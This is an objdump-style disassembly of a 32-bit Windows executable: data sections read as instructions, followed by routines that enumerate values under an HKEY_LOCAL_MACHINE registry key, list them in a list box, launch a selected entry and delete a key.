  401db1:	add    BYTE PTR [esi+0x0],ch
  401db4:	dec    ebp
  401db5:	add    BYTE PTR [ebx+0x0],dl
  401db8:	add    BYTE PTR gs:[ebx+0x0],ah
  401dbc:	add    BYTE PTR [eax],al
  401dbe:	add    BYTE PTR [eax],al
  401dc0:	fcomp  QWORD PTR [ebx]
  401dc2:	inc    eax
  401dc3:	add    BYTE PTR [eax],al
  401dc5:	add    BYTE PTR [eax],al
  401dc7:	add    BYTE PTR [esi+edx*1+0x40],cl
  401dcb:	add    BYTE PTR [eax+eax*1],al
  401dce:	add    BYTE PTR [eax],al
  401dd0:	int3   
  401dd1:	sbb    eax,DWORD PTR [eax+0x0]
  401dd4:	or     BYTE PTR [eax],al
	...
  401dde:	add    BYTE PTR [eax],al
  401de0:	stos   BYTE PTR es:[edi],al
  401de1:	aaa    
  401de2:	mov    ecx,0x983110c2
  401de7:	inc    ebx
  401de8:	mov    dl,BYTE PTR [esi-0xd]
  401deb:	dec    esp
  401dec:	arpl   WORD PTR [edx-0x2e],ax
  401def:	inc    esp
  401df0:	and    BYTE PTR [edx],dl
  401df2:	aam    0x92
  401df4:	lea    ebp,[ecx+0x19a456c]
  401dfa:	xchg   ecx,eax
  401dfb:	sbb    dl,BYTE PTR [eax]
  401dfd:	mov    al,ds:0xe7c
  401e02:	add    BYTE PTR [eax],al
  401e04:	outs   dx,BYTE PTR ds:[esi]
  401e05:	add    BYTE PTR [eax+eax*1+0x64],dh
  401e09:	add    BYTE PTR [eax+eax*1+0x6c],ch
  401e0d:	add    BYTE PTR [esi],ch
  401e0f:	add    BYTE PTR [eax+eax*1+0x6c],ah
  401e13:	add    BYTE PTR [eax+eax*1+0x0],ch
  401e17:	add    BYTE PTR [esp+eiz*2+0x72],cl
  401e1b:	inc    esi
  401e1c:	popa   
  401e1d:	jae    0x401e93
  401e1f:	inc    esi
  401e20:	popa   
  401e21:	imul   ebp,DWORD PTR [ecx+ecx*2+0x6e],0x64616f4c
  401e29:	gs jb  0x401e6f
  401e2c:	popa   
  401e2d:	ins    BYTE PTR es:[edi],dx
  401e2e:	ins    BYTE PTR es:[edi],dx
  401e2f:	outs   dx,DWORD PTR ds:[esi]
  401e30:	jne    0x401ea6
  401e32:	add    BYTE PTR [eax],al
  401e34:	push   edx
  401e35:	je     0x401ea3
  401e37:	dec    esi
  401e38:	je     0x401e8d
  401e3a:	je     0x401e9d
  401e3c:	je     0x401eb3
  401e3e:	jae    0x401e94
  401e40:	outs   dx,DWORD PTR ds:[esi]
  401e41:	inc    esp
  401e42:	outs   dx,DWORD PTR ds:[esi]
  401e43:	jae    0x401e8a
  401e45:	jb     0x401eb9
  401e47:	outs   dx,DWORD PTR ds:[esi]
  401e48:	jb     0x401e98
  401e4a:	outs   dx,DWORD PTR ds:[esi]
  401e4b:	push   esp
  401e4c:	bound  eax,QWORD PTR gs:[eax]
  401e4f:	add    BYTE PTR [eax],ah
  401e51:	add    BYTE PTR [eax],al
  401e53:	add    dh,ah
  401e55:	adc    al,0x2
  401e57:	add    BYTE PTR [eax],al
  401e59:	add    BYTE PTR [eax],al
  401e5b:	add    al,al
  401e5d:	add    BYTE PTR [eax],al
  401e5f:	add    BYTE PTR [eax],al
  401e61:	add    BYTE PTR [eax],al
  401e63:	inc    esi
	...
  401e74:	sub    edi,DWORD PTR [edi+ebx*4]
  401e77:	push   ebp
  401e78:	add    BYTE PTR [eax],al
  401e7a:	add    BYTE PTR [eax],al
  401e7c:	add    al,BYTE PTR [eax]
  401e7e:	add    BYTE PTR [eax],al
  401e80:	and    al,0x0
  401e82:	add    BYTE PTR [eax],al
  401e84:	cmp    BYTE PTR [edi],bl
  401e86:	add    BYTE PTR [eax],al
  401e88:	cmp    BYTE PTR [ebx],dl
  401e8a:	add    BYTE PTR [eax],al
  401e8c:	add    BYTE PTR [eax],al
  401e8e:	add    BYTE PTR [eax],al
  401e90:	sub    edi,DWORD PTR [edi+ebx*4]
  401e93:	push   ebp
  401e94:	add    BYTE PTR [eax],al
  401e96:	add    BYTE PTR [eax],al
  401e98:	or     eax,0x0
  401e9d:	add    al,BYTE PTR [eax]
  401e9f:	add    BYTE PTR [eax+0x1f],dh
  401ea2:	add    BYTE PTR [eax],al
  401ea4:	jo     0x401eb9
	...
  401ec6:	add    BYTE PTR [eax],al
  401ec8:	push   0x0
	...
  401f01:	add    BYTE PTR [eax],al
  401f03:	add    BYTE PTR [eax+esi*2],al
  401f06:	inc    eax
  401f07:	add    BYTE PTR [eax],dh
  401f09:	pop    ds
  401f0a:	inc    eax
  401f0b:	add    BYTE PTR [edx],al
  401f0d:	add    BYTE PTR [eax],al
  401f0f:	add    al,dh
  401f11:	add    BYTE PTR [eax+0x0],0x0
  401f15:	add    BYTE PTR [eax],al
  401f17:	add    BYTE PTR [eax],ah
  401f19:	adc    BYTE PTR [eax+0x0],al
  401f1c:	das    
  401f1d:	add    BYTE PTR [eax],al
  401f1f:	add    BYTE PTR [eax],al
  401f21:	xor    eax,0x0
	...
  401f2e:	add    BYTE PTR [eax],al
  401f30:	shr    BYTE PTR [eax+0x0],0x0
  401f34:	stc    
  401f35:	push   0x0
  401f37:	add    BYTE PTR [edx+0x53],dl
  401f3a:	inc    esp
  401f3b:	push   ebx
  401f3c:	or     DWORD PTR [edx],0xcd29f683
  401f42:	aaa    
  401f43:	dec    eax
  401f44:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  401f45:	inc    ebx
  401f46:	mov    esp,0x1bda50f6
  401f4b:	cmp    eax,DWORD PTR [ecx]
  401f4d:	add    BYTE PTR [eax],al
  401f4f:	add    BYTE PTR [edx+0x75],dh
  401f52:	outs   dx,BYTE PTR ds:[esi]
  401f53:	outs   dx,DWORD PTR ds:[esi]
  401f54:	outs   dx,BYTE PTR ds:[esi]
  401f55:	arpl   WORD PTR [ebp+0x2e],sp
  401f58:	jo     0x401fbe
  401f5a:	bound  eax,QWORD PTR [eax]
	...
  401f70:	inc    edi
  401f71:	inc    ebx
  401f72:	push   esp
  401f73:	dec    esp
  401f74:	add    BYTE PTR [eax],dl
  401f76:	add    BYTE PTR [eax],al
  401f78:	add    al,0x0
  401f7a:	add    BYTE PTR [eax],al
  401f7c:	cs inc ebx
  401f7e:	push   edx
  401f7f:	push   esp
  401f80:	and    al,0x58
  401f82:	inc    ebx
  401f83:	inc    ecx
  401f84:	add    BYTE PTR [eax],al
  401f86:	add    BYTE PTR [eax],al
  401f88:	add    al,0x10
  401f8a:	add    BYTE PTR [eax],al
  401f8c:	add    al,0x0
  401f8e:	add    BYTE PTR [eax],al
  401f90:	cs inc ebx
  401f92:	push   edx
  401f93:	push   esp
  401f94:	and    al,0x58
  401f96:	inc    ebx
  401f97:	inc    ecx
  401f98:	inc    ecx
  401f99:	add    BYTE PTR [eax],al
  401f9b:	add    BYTE PTR [eax],cl
  401f9d:	adc    BYTE PTR [eax],al
  401f9f:	add    BYTE PTR [eax+eax*1],al
  401fa2:	add    BYTE PTR [eax],al
  401fa4:	cs inc ebx
  401fa6:	push   edx
  401fa7:	push   esp
  401fa8:	and    al,0x58
  401faa:	inc    ebx
  401fab:	push   ebp
  401fac:	add    BYTE PTR [eax],al
  401fae:	add    BYTE PTR [eax],al
  401fb0:	or     al,0x10
  401fb2:	add    BYTE PTR [eax],al
  401fb4:	add    al,0x0
  401fb6:	add    BYTE PTR [eax],al
  401fb8:	cs inc ebx
  401fba:	push   edx
  401fbb:	push   esp
  401fbc:	and    al,0x58
  401fbe:	inc    ebx
  401fbf:	pop    edx
  401fc0:	add    BYTE PTR [eax],al
  401fc2:	add    BYTE PTR [eax],al
  401fc4:	adc    BYTE PTR [eax],dl
  401fc6:	add    BYTE PTR [eax],al
  401fc8:	add    al,0x0
  401fca:	add    BYTE PTR [eax],al
  401fcc:	cs inc ebx
  401fce:	push   edx
  401fcf:	push   esp
  401fd0:	and    al,0x58
  401fd2:	dec    ecx
  401fd3:	inc    ecx
  401fd4:	add    BYTE PTR [eax],al
  401fd6:	add    BYTE PTR [eax],al
  401fd8:	adc    al,0x10
  401fda:	add    BYTE PTR [eax],al
  401fdc:	add    al,0x0
  401fde:	add    BYTE PTR [eax],al
  401fe0:	cs inc ebx
  401fe2:	push   edx
  401fe3:	push   esp
  401fe4:	and    al,0x58
  401fe6:	dec    ecx
  401fe7:	inc    ecx
  401fe8:	inc    ecx
  401fe9:	add    BYTE PTR [eax],al
  401feb:	add    BYTE PTR [eax],bl
  401fed:	adc    BYTE PTR [eax],al
  401fef:	add    BYTE PTR [eax+eax*1],al
  401ff2:	add    BYTE PTR [eax],al
  401ff4:	cs inc ebx
  401ff6:	push   edx
  401ff7:	push   esp
  401ff8:	and    al,0x58
  401ffa:	dec    ecx
  401ffb:	pop    ecx
  401ffc:	add    BYTE PTR [eax],al
  401ffe:	add    BYTE PTR [eax],al
  402000:	sbb    al,0x10
  402002:	add    BYTE PTR [eax],al
  402004:	add    al,0x0
  402006:	add    BYTE PTR [eax],al
  402008:	cs inc ebx
  40200a:	push   edx
  40200b:	push   esp
  40200c:	and    al,0x58
  40200e:	dec    ecx
  40200f:	pop    edx
  402010:	add    BYTE PTR [eax],al
  402012:	add    BYTE PTR [eax],al
  402014:	and    BYTE PTR [eax],dl
  402016:	add    BYTE PTR [eax],al
  402018:	mov    esp,0x2e000000
  40201d:	imul   sp,WORD PTR [si+0x73],0x7824
  402024:	add    BYTE PTR [eax],al
  402026:	add    BYTE PTR [eax],al
  402028:	loopne 0x40203a
  40202a:	add    BYTE PTR [eax],al
  40202c:	push   eax
  40202d:	push   cs
  40202e:	add    BYTE PTR [eax],al
  402030:	cs jb  0x402097
  402033:	popa   
  402034:	je     0x402097
  402036:	add    BYTE PTR [eax],al
  402038:	xor    BYTE PTR [edi],bl
  40203a:	add    BYTE PTR [eax],al
  40203c:	or     BYTE PTR [eax],al
  40203e:	add    BYTE PTR [eax],al
  402040:	cs jb  0x4020a7
  402043:	popa   
  402044:	je     0x4020a7
  402046:	and    al,0x73
  402048:	js     0x4020ae
  40204a:	popa   
  40204b:	je     0x4020ae
  40204d:	add    BYTE PTR [eax],al
  40204f:	add    BYTE PTR [eax],bh
  402051:	pop    ds
  402052:	add    BYTE PTR [eax],al
  402054:	cmp    BYTE PTR [edx],al
  402056:	add    BYTE PTR [eax],al
  402058:	cs jb  0x4020bf
  40205b:	popa   
  40205c:	je     0x4020bf
  40205e:	and    al,0x7a
  402060:	jp     0x4020dc
  402062:	bound  esp,QWORD PTR fs:[edi+0x0]
  402066:	add    BYTE PTR [eax],al
  402068:	jo     0x40208b
  40206a:	add    BYTE PTR [eax],al
  40206c:	pop    ds
  40206d:	add    BYTE PTR [eax],al
  40206f:	add    BYTE PTR [esi],ch
  402071:	je     0x4020d8
  402073:	js     0x4020e9
  402075:	and    al,0x64
  402077:	imul   eax,DWORD PTR [eax],0x90000000
  40207d:	and    DWORD PTR [eax],eax
  40207f:	add    BYTE PTR [ecx+ecx*2+0x0],ah
  402083:	add    BYTE PTR [esi],ch
  402085:	je     0x4020ec
  402087:	js     0x4020fd
  402089:	and    al,0x6d
  40208b:	outs   dx,BYTE PTR ds:[esi]
  40208c:	add    BYTE PTR [eax],al
  40208e:	add    BYTE PTR [eax],al
  402090:	hlt    
  402091:	push   0x0
  402093:	add    BYTE PTR [eax],ah
  402095:	add    BYTE PTR [eax],al
  402097:	add    BYTE PTR [esi],ch
  402099:	je     0x402100
  40209b:	js     0x402111
  40209d:	and    al,0x78
  40209f:	add    BYTE PTR [eax],bl
  4020a1:	imul   eax,DWORD PTR [eax],0x0
  4020a4:	mov    esp,0x2e000000
  4020a9:	js     0x40210f
  4020ab:	popa   
  4020ac:	je     0x40210f
  4020ae:	and    al,0x78
  4020b0:	add    BYTE PTR [eax],al
  4020b2:	add    BYTE PTR [eax],al
  4020b4:	add    BYTE PTR [eax+0x0],dh
  4020b7:	add    BYTE PTR [eax+0x2e000001],al
  4020bd:	fs popa 
  4020bf:	je     0x402122
  4020c1:	add    BYTE PTR [eax],al
  4020c3:	add    BYTE PTR [eax+0x1c000071],al
  4020c9:	add    al,0x0
  4020cb:	add    BYTE PTR [esi],ch
  4020cd:	bound  esi,QWORD PTR [ebx+0x73]
  4020d0:	add    BYTE PTR [eax],al
  4020d2:	add    BYTE PTR [eax],al
  4020d4:	add    BYTE PTR [eax+0x2f00000],al
  4020da:	add    BYTE PTR [eax],al
  4020dc:	imul   esp,DWORD PTR cs:[ecx+eiz*2+0x74],0x352461
  4020e5:	add    BYTE PTR [eax],al
  4020e7:	add    al,dh
  4020e9:	add    BYTE PTR [eax],0x0
  4020ec:	add    al,0x0
  4020ee:	add    BYTE PTR [eax],al
  4020f0:	xor    BYTE PTR cs:[eax],dh
  4020f3:	arpl   WORD PTR [esi+0x67],sp
  4020f6:	add    BYTE PTR [eax],al
  4020f8:	hlt    
  4020f9:	add    BYTE PTR [eax],0x0
  4020fc:	hlt    
  4020fd:	add    DWORD PTR [eax],eax
  4020ff:	add    BYTE PTR [esi],ch
  402101:	imul   esp,DWORD PTR [ecx+eiz*2+0x74],0x322461
  402109:	add    BYTE PTR [eax],al
  40210b:	add    al,ch
  40210d:	test   BYTE PTR [eax],al
  40210f:	add    BYTE PTR [eax+eax*1],dl
  402112:	add    BYTE PTR [eax],al
  402114:	imul   esp,DWORD PTR cs:[ecx+eiz*2+0x74],0x332461
  40211d:	add    BYTE PTR [eax],al
  40211f:	add    ah,bh
  402121:	test   BYTE PTR [eax],al
  402123:	add    al,dh
  402125:	add    al,BYTE PTR [eax]
  402127:	add    BYTE PTR [esi],ch
  402129:	imul   esp,DWORD PTR [ecx+eiz*2+0x74],0x342461
  402131:	add    BYTE PTR [eax],al
  402133:	add    ah,ch
  402135:	xchg   DWORD PTR [eax],eax
  402137:	add    BYTE PTR [edx+0x2e00000c],ah
  40213d:	imul   esp,DWORD PTR [ecx+eiz*2+0x74],0x362461
  402145:	add    BYTE PTR [eax],al
  402147:	add    BYTE PTR [eax],al
  402149:	mov    al,ds:0x1800000
  40214e:	add    BYTE PTR [eax],al
  402150:	cs jb  0x4021c6
  402153:	jb     0x4021b8
  402155:	and    al,0x30
  402157:	xor    DWORD PTR [eax],eax
  402159:	add    BYTE PTR [eax],al
  40215b:	add    BYTE PTR [eax-0xfffff5f],al
  402161:	or     eax,DWORD PTR [eax]
  402163:	add    BYTE PTR [esi],ch
  402165:	jb     0x4021da
  402167:	jb     0x4021cc
  402169:	and    al,0x30
  40216b:	xor    al,BYTE PTR [eax]
  40216d:	add    BYTE PTR [eax],al
  40216f:	add    bh,al
  402171:	add    eax,0x40751c
  402176:	jo     0x4021d4
  402178:	inc    eax
  402179:	add    bh,al
  40217b:	add    eax,0x407514
  402180:	pusha  
  402181:	pop    ebp
  402182:	inc    eax
  402183:	add    bh,al
  402185:	add    eax,0x407518
  40218a:	mov    al,0x5d
  40218c:	inc    eax
  40218d:	add    bl,al
  40218f:	int3   
  402190:	int3   
  402191:	int3   
  402192:	int3   
  402193:	int3   
  402194:	int3   
  402195:	mov    edi,edi
  402197:	push   ebp
  402198:	mov    ebp,esp
  40219a:	sub    esp,0x60
  40219d:	mov    eax,ds:0x407004
  4021a2:	xor    eax,ebp
  4021a4:	mov    DWORD PTR [ebp-0x4],eax
  4021a7:	push   ebx
  4021a8:	push   esi
  4021a9:	push   0xb
  4021ab:	mov    esi,ecx
  4021ad:	call   DWORD PTR ds:0x408150
  4021b3:	push   0xc
  4021b5:	mov    ds:0x4074f0,eax
  4021ba:	call   DWORD PTR ds:0x408150
  4021c0:	push   0x31
  4021c2:	mov    ds:0x4074ec,eax
  4021c7:	call   DWORD PTR ds:0x408150
  4021cd:	push   0x32
  4021cf:	mov    ds:0x4074e8,eax
  4021d4:	call   DWORD PTR ds:0x408150
  4021da:	push   0xf
  4021dc:	mov    ds:0x4074e4,eax
  4021e1:	call   DWORD PTR ds:0x40814c
  4021e7:	push   eax
  4021e8:	call   DWORD PTR ds:0x408040
  4021ee:	xor    ebx,ebx
  4021f0:	mov    ds:0x4074d8,eax
  4021f5:	push   ebx
  4021f6:	push   ebx
  4021f7:	push   0x31
  4021f9:	push   esi
  4021fa:	call   DWORD PTR ds:0x408148
  402200:	movzx  eax,ax
  402203:	test   eax,eax
  402205:	je     0x402244
  402207:	lea    ecx,[ebp-0x60]
  40220a:	push   ecx
  40220b:	push   0x5c
  40220d:	push   eax
  40220e:	call   DWORD PTR ds:0x408044
  402214:	test   eax,eax
  402216:	je     0x402244
  402218:	lea    eax,[ebp-0x60]
  40221b:	mov    DWORD PTR [ebp-0x50],0x190
  402222:	push   eax
  402223:	call   DWORD PTR ds:0x408048
  402229:	mov    ds:0x4074e0,eax
  40222e:	lea    eax,[ebp-0x60]
  402231:	push   eax
  402232:	mov    DWORD PTR [ebp-0x50],0x2bc
  402239:	call   DWORD PTR ds:0x408048
  40223f:	mov    ds:0x4074dc,eax
  402244:	cmp    DWORD PTR ds:0x4074e0,ebx
  40224a:	je     0x402296
  40224c:	push   edi
  40224d:	push   ebx
  40224e:	call   DWORD PTR ds:0x40810c
  402254:	push   DWORD PTR ds:0x4074e0
  40225a:	mov    edi,eax
  40225c:	push   edi
  40225d:	call   DWORD PTR ds:0x40804c
  402263:	push   0x407590
  402268:	mov    ebx,0x407048
  40226d:	mov    esi,eax
  40226f:	push   ebx
  402270:	call   DWORD PTR ds:0x408068
  402276:	push   eax
  402277:	push   ebx
  402278:	push   edi
  402279:	call   DWORD PTR ds:0x408050
  40227f:	push   esi
  402280:	push   edi
  402281:	call   DWORD PTR ds:0x40804c
  402287:	push   edi
  402288:	push   0x0
  40228a:	call   DWORD PTR ds:0x408110
  402290:	xor    eax,eax
  402292:	inc    eax
  402293:	pop    edi
  402294:	jmp    0x402298
  402296:	xor    eax,eax
  402298:	mov    ecx,DWORD PTR [ebp-0x4]
  40229b:	pop    esi
  40229c:	xor    ecx,ebp
  40229e:	pop    ebx
  40229f:	call   0x4063a0
  4022a4:	mov    esp,ebp
  4022a6:	pop    ebp
  4022a7:	ret    
  4022a8:	int3   
  4022a9:	int3   
  4022aa:	int3   
  4022ab:	int3   
  4022ac:	int3   
  4022ad:	mov    edi,edi
  4022af:	push   ebp
  4022b0:	mov    ebp,esp
  4022b2:	sub    esp,0x62c
  4022b8:	mov    eax,ds:0x407004
  4022bd:	xor    eax,ebp
  4022bf:	mov    DWORD PTR [ebp-0x4],eax
  4022c2:	push   ebx
  4022c3:	push   ecx
  4022c4:	push   0x4070e0
  4022c9:	mov    ebx,ecx
  4022cb:	mov    edx,0x104
  4022d0:	push   ecx
  4022d1:	lea    ecx,[ebp-0x61c]
  4022d7:	call   0x402bee
  4022dc:	push   ecx
  4022dd:	lea    ecx,[ebp-0x61c]
  4022e3:	call   0x402bad
  4022e8:	lea    eax,[ebp-0x620]
  4022ee:	push   eax
  4022ef:	push   0x1
  4022f1:	push   0x0
  4022f3:	lea    eax,[ebp-0x61c]
  4022f9:	push   eax
  4022fa:	push   0x80000002
  4022ff:	call   DWORD PTR ds:0x408000
  402305:	test   eax,eax
  402307:	jne    0x402421
  40230d:	push   edi
  40230e:	lea    eax,[ebp-0x628]
  402314:	mov    DWORD PTR [ebp-0x624],0x104
  40231e:	push   eax
  40231f:	lea    eax,[ebp-0x414]
  402325:	mov    DWORD PTR [ebp-0x628],0x208
  40232f:	push   eax
  402330:	lea    eax,[ebp-0x62c]
  402336:	xor    edi,edi
  402338:	push   eax
  402339:	push   edi
  40233a:	lea    eax,[ebp-0x624]
  402340:	push   eax
  402341:	lea    eax,[ebp-0x20c]
  402347:	push   eax
  402348:	push   edi
  402349:	push   DWORD PTR [ebp-0x620]
  40234f:	call   DWORD PTR ds:0x40800c
  402355:	test   eax,eax
  402357:	jne    0x402414
  40235d:	push   esi
  40235e:	cmp    DWORD PTR [ebp-0x62c],0x1
  402365:	jne    0x4023c4
  402367:	push   0x314
  40236c:	push   0x40
  40236e:	call   DWORD PTR ds:0x40806c
  402374:	mov    esi,eax
  402376:	test   esi,esi
  402378:	je     0x4023c4
  40237a:	lea    eax,[ebp-0x20c]
  402380:	mov    edx,0x80
  402385:	push   eax
  402386:	mov    ecx,esi
  402388:	call   0x402c3e
  40238d:	lea    eax,[ebp-0x414]
  402393:	mov    edx,0x104
  402398:	push   eax
  402399:	lea    ecx,[esi+0x108]
  40239f:	call   0x402c3e
  4023a4:	push   esi
  4023a5:	push   0x0
  4023a7:	push   0x180
  4023ac:	push   ebx
  4023ad:	call   DWORD PTR ds:0x408148
  4023b3:	cmp    eax,0xffffffff
  4023b6:	je     0x4023bd
  4023b8:	cmp    eax,0xfffffffe
  4023bb:	jne    0x4023c4
  4023bd:	push   esi
  4023be:	call   DWORD PTR ds:0x408070
  4023c4:	lea    eax,[ebp-0x628]
  4023ca:	mov    DWORD PTR [ebp-0x624],0x104
  4023d4:	push   eax
  4023d5:	lea    eax,[ebp-0x414]
  4023db:	mov    DWORD PTR [ebp-0x628],0x208
  4023e5:	push   eax
  4023e6:	lea    eax,[ebp-0x62c]
  4023ec:	inc    edi
  4023ed:	push   eax
  4023ee:	push   0x0
  4023f0:	lea    eax,[ebp-0x624]
  4023f6:	push   eax
  4023f7:	lea    eax,[ebp-0x20c]
  4023fd:	push   eax
  4023fe:	push   edi
  4023ff:	push   DWORD PTR [ebp-0x620]
  402405:	call   DWORD PTR ds:0x40800c
  40240b:	test   eax,eax
  40240d:	je     0x40235e
  402413:	pop    esi
  402414:	push   DWORD PTR [ebp-0x620]
  40241a:	call   DWORD PTR ds:0x408008
  402420:	pop    edi
  402421:	mov    ecx,DWORD PTR [ebp-0x4]
  402424:	xor    ecx,ebp
  402426:	pop    ebx
  402427:	call   0x4063a0
  40242c:	mov    esp,ebp
  40242e:	pop    ebp
  40242f:	ret    
  402430:	int3   
  402431:	int3   
  402432:	int3   
  402433:	int3   
  402434:	int3   
  402435:	mov    edi,edi
  402437:	push   ebp
  402438:	mov    ebp,esp
  40243a:	sub    esp,0x68
  40243d:	mov    eax,ds:0x407004
  402442:	xor    eax,ebp
  402444:	mov    DWORD PTR [ebp-0x4],eax
  402447:	push   ebx
  402448:	push   esi
  402449:	push   edi
  40244a:	lea    eax,[ebp-0x14]
  40244d:	movzx  esi,dx
  402450:	mov    edi,ecx
  402452:	push   eax
  402453:	push   edi
  402454:	call   DWORD PTR ds:0x408114
  40245a:	xor    ebx,ebx
  40245c:	push   ebx
  40245d:	push   esi
  40245e:	push   0x186
  402463:	push   edi
  402464:	call   DWORD PTR ds:0x408148
  40246a:	push   ebx
  40246b:	push   esi
  40246c:	push   0x199
  402471:	push   edi
  402472:	call   DWORD PTR ds:0x408148
  402478:	mov    ecx,eax
  40247a:	cmp    ecx,0xffffffff
  40247d:	je     0x4024f6
  40247f:	mov    eax,DWORD PTR [ebp-0xc]
  402482:	add    eax,0x5
  402485:	mov    DWORD PTR [ebp-0x68],0x44
  40248c:	mov    DWORD PTR [ebp-0x58],eax
  40248f:	mov    eax,DWORD PTR [ebp-0x10]
  402492:	add    eax,0x5
  402495:	mov    DWORD PTR [ebp-0x64],ebx
  402498:	mov    DWORD PTR [ebp-0x54],eax
  40249b:	xor    eax,eax
  40249d:	mov    WORD PTR [ebp-0x36],ax
  4024a1:	lea    eax,[ebp-0x24]
  4024a4:	push   eax
  4024a5:	lea    eax,[ebp-0x68]
  4024a8:	mov    DWORD PTR [ebp-0x60],ebx
  4024ab:	push   eax
  4024ac:	push   ebx
  4024ad:	push   ebx
  4024ae:	push   0x200
  4024b3:	push   ebx
  4024b4:	push   ebx
  4024b5:	push   ebx
  4024b6:	lea    eax,[ecx+0x108]
  4024bc:	mov    DWORD PTR [ebp-0x5c],ebx
  4024bf:	push   eax
  4024c0:	push   ebx
  4024c1:	mov    DWORD PTR [ebp-0x3c],0x4
  4024c8:	mov    DWORD PTR [ebp-0x34],ebx
  4024cb:	call   DWORD PTR ds:0x408074
  4024d1:	test   eax,eax
  4024d3:	je     0x4024f6
  4024d5:	push   0x1
  4024d7:	push   0xffffffff
  4024d9:	push   DWORD PTR [ebp-0x24]
  4024dc:	call   DWORD PTR ds:0x408078
  4024e2:	push   DWORD PTR [ebp-0x24]
  4024e5:	call   DWORD PTR ds:0x40807c
  4024eb:	push   DWORD PTR [ebp-0x20]
  4024ee:	call   DWORD PTR ds:0x40807c
  4024f4:	jmp    0x4024fe
  4024f6:	push   0x30
  4024f8:	call   DWORD PTR ds:0x408118
  4024fe:	push   ebx
  4024ff:	push   0xffffffff
  402501:	push   0x186
  402506:	push   edi
  402507:	call   DWORD PTR ds:0x408148
  40250d:	mov    ecx,DWORD PTR [ebp-0x4]
  402510:	xor    eax,eax
  402512:	pop    edi
  402513:	pop    esi
  402514:	xor    ecx,ebp
  402516:	pop    ebx
  402517:	call   0x4063a0
  40251c:	mov    esp,ebp
  40251e:	pop    ebp
  40251f:	ret    
  402520:	int3   
  402521:	int3   
  402522:	int3   
  402523:	int3   
  402524:	int3   
  402525:	int3   
  402526:	int3   
  402527:	int3   
  402528:	int3   
  402529:	int3   
  40252a:	int3   
  40252b:	int3   
  40252c:	int3   
  40252d:	int3   
  40252e:	int3   
  40252f:	int3   
  402530:	mov    edi,edi
  402532:	push   ebp
  402533:	mov    ebp,esp
  402535:	sub    esp,0x4c4
  40253b:	mov    eax,ds:0x407004
  402540:	xor    eax,ebp
  402542:	mov    DWORD PTR [ebp-0x4],eax
  402545:	push   ebx
  402546:	push   esi
  402547:	mov    esi,DWORD PTR [ebp+0x8]
  40254a:	push   edi
  40254b:	push   0x0
  40254d:	push   0x0
  40254f:	push   0x18b
  402554:	push   esi
  402555:	call   DWORD PTR ds:0x408148
  40255b:	movzx  ebx,ax
  40255e:	xor    edi,edi
  402560:	xor    eax,eax
  402562:	cmp    ax,bx
  402565:	jae    0x402576
  402567:	mov    edx,edi
  402569:	mov    ecx,esi
  40256b:	call   0x402435
  402570:	inc    edi
  402571:	cmp    di,bx
  402574:	jb     0x402567
  402576:	push   ecx
  402577:	push   0x4070e0
  40257c:	push   ecx
  40257d:	mov    edx,0x104
  402582:	lea    ecx,[ebp-0x4b4]
  402588:	call   0x402bee
  40258d:	push   ecx
  40258e:	lea    ecx,[ebp-0x4b4]
  402594:	call   0x402bad
  402599:	lea    eax,[ebp-0x4b4]
  40259f:	mov    edi,0x80000002
  4025a4:	push   eax
  4025a5:	push   edi
  4025a6:	call   DWORD PTR ds:0x408010
  4025ac:	xor    ebx,ebx
  4025ae:	test   BYTE PTR ds:0x4074f8,0x6
  4025b5:	je     0x4026df
  4025bb:	lea    eax,[ebp-0x4b8]
  4025c1:	mov    DWORD PTR [ebp-0x4bc],ebx
  4025c7:	push   eax
  4025c8:	push   0x2
  4025ca:	push   ebx
  4025cb:	push   0x4070e0
  4025d0:	push   edi
  4025d1:	call   DWORD PTR ds:0x408000
  4025d7:	test   eax,eax
  4025d9:	jne    0x4025f8
  4025db:	push   0x407060
  4025e0:	push   DWORD PTR [ebp-0x4b8]
  4025e6:	call   DWORD PTR ds:0x408004
  4025ec:	push   DWORD PTR [ebp-0x4b8]
  4025f2:	call   DWORD PTR ds:0x408008
  4025f8:	xor    eax,eax
  4025fa:	push   0x104
  4025ff:	mov    WORD PTR [ebp-0x2ac],ax
  402606:	lea    eax,[ebp-0x2ac]
  40260c:	push   eax
  40260d:	push   0x3
  40260f:	push   DWORD PTR ds:0x407584
  402615:	call   DWORD PTR ds:0x40811c
  40261b:	push   0x50
  40261d:	lea    eax,[ebp-0xa4]
  402623:	push   eax
  402624:	push   esi
  402625:	call   DWORD PTR ds:0x408178
  40262b:	push   eax
  40262c:	call   DWORD PTR ds:0x40817c
  402632:	lea    eax,[ebp-0x4b8]
  402638:	push   eax
  402639:	push   0x1
  40263b:	push   ebx
  40263c:	push   0x407088
  402641:	push   edi
  402642:	call   DWORD PTR ds:0x408000
  402648:	test   eax,eax
  40264a:	jne    0x402695
  40264c:	lea    eax,[ebp-0x4c0]
  402652:	mov    DWORD PTR [ebp-0x4c0],0x4
  40265c:	push   eax
  40265d:	lea    eax,[ebp-0x4bc]
  402663:	push   eax
  402664:	lea    eax,[ebp-0x4c4]
  40266a:	push   eax
  40266b:	push   ebx
  40266c:	push   0x4013a0
  402671:	push   DWORD PTR [ebp-0x4b8]
  402677:	call   DWORD PTR ds:0x408014
  40267d:	push   DWORD PTR [ebp-0x4b8]
  402683:	neg    eax
  402685:	sbb    eax,eax
  402687:	not    eax
  402689:	and    DWORD PTR [ebp-0x4bc],eax
  40268f:	call   DWORD PTR ds:0x408008
  402695:	test   BYTE PTR [ebp-0x4bc],0x4
  40269c:	je     0x4026b8
  40269e:	push   0x4013b8
  4026a3:	push   ebx
  4026a4:	push   0x4013d0
  4026a9:	push   0x4013ec
  4026ae:	call   DWORD PTR ds:0x408080
  4026b4:	test   eax,eax
  4026b6:	jne    0x4026d6
  4026b8:	push   0x30
  4026ba:	lea    eax,[ebp-0xa4]
  4026c0:	push   eax
  4026c1:	lea    eax,[ebp-0x2ac]
  4026c7:	push   eax
  4026c8:	push   esi
  4026c9:	call   DWORD PTR ds:0x408178
  4026cf:	push   eax
  4026d0:	call   DWORD PTR ds:0x408174
  4026d6:	push   ebx
  4026d7:	push   0x2
  4026d9:	call   DWORD PTR ds:0x408170
  4026df:	push   ebx
  4026e0:	push   ebx
  4026e1:	push   0x523
  4026e6:	push   esi
  4026e7:	call   DWORD PTR ds:0x408178
  4026ed:	push   eax
  4026ee:	call   DWORD PTR ds:0x40816c
  4026f4:	mov    ecx,DWORD PTR [ebp-0x4]
  4026f7:	xor    eax,eax
  4026f9:	pop    edi
  4026fa:	pop    esi
  4026fb:	xor    ecx,ebp
  4026fd:	pop    ebx
